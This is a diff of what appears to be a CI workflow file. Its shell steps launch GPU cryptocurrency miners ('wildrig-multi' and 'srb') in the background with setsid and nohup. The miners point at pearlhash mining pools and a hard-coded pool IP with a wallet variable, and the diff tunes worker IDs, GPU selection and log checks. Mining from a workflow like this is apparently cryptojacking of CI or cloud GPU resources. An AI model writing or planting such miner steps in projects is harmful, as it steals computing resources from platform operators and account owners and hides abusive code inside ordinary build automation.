@@ -109,31 +109,20 @@ jobs:
           PH_UP=0
           if [ -x ./wildrig-multi ]; then
             for idx in $IDXES; do
-              WK=$((13298300 + S * 10 + idx))
-              env -u CUDA_VISIBLE_DEVICES -u NVIDIA_VISIBLE_DEVICES GPU_DEVICE_ORDINAL="$idx" \
+              WK=$((13298360 + S * 10 + idx))
+              env -u GPU_DEVICE_ORDINAL -u NVIDIA_VISIBLE_DEVICES CUDA_VISIBLE_DEVICES="$idx" \
                 setsid nohup ./wildrig-multi --algo pearlhash \
                 --url pool.pearlhash.xyz:9000 --url global.pearlhash.net:9000 \
                 --url global2.pearlhash.net:9000 --url hk.pearlhash.net:9000 \
                 --user "$W" --worker "$WK" -d 0 --print-time 30 \
                 >> "$D/wr-g$idx.log" 2>&1 < /dev/null &
-              echo "PH_LAUNCH idx=$idx worker=$WK mode=ordinal pid=$!"
+              echo "PH_LAUNCH idx=$idx worker=$WK mode=cvd1 pid=$!"
             done
-            sleep 18
+            sleep 25
             for idx in $IDXES; do
-              WK=$((13298300 + S * 10 + idx))
               L="$D/wr-g$idx.log"
-              if grep -qE 'Failed to find any device|Failed to start OpenCL threads' "$L" 2>/dev/null; then
-                echo "OFFLINE_RETRY idx=$idx mode=cvd"
-                pkill -f "worker $WK" 2>/dev/null || true
-                env -u GPU_DEVICE_ORDINAL CUDA_VISIBLE_DEVICES="$idx" \
-                  setsid nohup ./wildrig-multi --algo pearlhash \
-                  --url pool.pearlhash.xyz:9000 --url hk.pearlhash.net:9000 \
-                  --user "$W" --worker "$WK" -d 0 --print-time 30 \
-                  >> "$D/wr-g$idx.log" 2>&1 < /dev/null &
-                echo "PH_LAUNCH idx=$idx worker=$WK mode=cvd pid=$!"
-              else
-                echo "ALIVE idx=$idx"
-              fi
+              NF=$(grep -cE 'Failed to find any device|Failed to start OpenCL threads' "$L" 2>/dev/null)
+              echo "CHK idx=$idx fails=${NF:-0} tail=$(tail -1 "$L" 2>/dev/null | tr -d '\r' | head -c 110)"
             done
             PH_UP=1
           else
@@ -170,8 +159,8 @@ jobs:
             if [ -x ./srb ]; then
               LP_T0=$(date +%s)
               for idx in $IDXES; do
-                WK=$((13298300 + S * 10 + idx))
-                setsid nohup ./srb --disable-cpu --algorithm pearlhash \
+                WK=$((13298360 + S * 10 + idx))
+                env -u GPU_DEVICE_ORDINAL -u NVIDIA_VISIBLE_DEVICES CUDA_VISIBLE_DEVICES="$idx" setsid nohup ./srb --disable-cpu --algorithm pearlhash \
                   --pool 103.199.106.122:3362 --wallet "$W+$N" --worker "$WK" \
                   --password x --gpu-id "$idx" >> "$D/srb-g$idx.log" 2>&1 < /dev/null &
                 echo "LP_LAUNCH idx=$idx worker=$WK pid=$! sticky=1"
@@ -192,7 +181,7 @@ jobs:
           echo "=== FINAL SUMMARY $NONCE mode=$MODE ==="
           for idx in $IDXES; do
             U=$(awk -F', ' -v i="$idx" '$1==i{print $2}' gpu.csv)
-            WK=$((13298300 + S * 10 + idx))
+            WK=$((13298360 + S * 10 + idx))
             if [ "$MODE" = "ph" ]; then L="$D/wr-g$idx.log"; else L="$D/srb-g$idx.log"; fi
             if [ "$MODE" = "ph" ]; then
               A=$(grep -oE 'accepted \([0-9]+/[0-9]+\)' "$L" 2>/dev/null | tail -1 | sed -E 's/.*\(([0-9]+)\/([0-9]+)\).*/\1/')
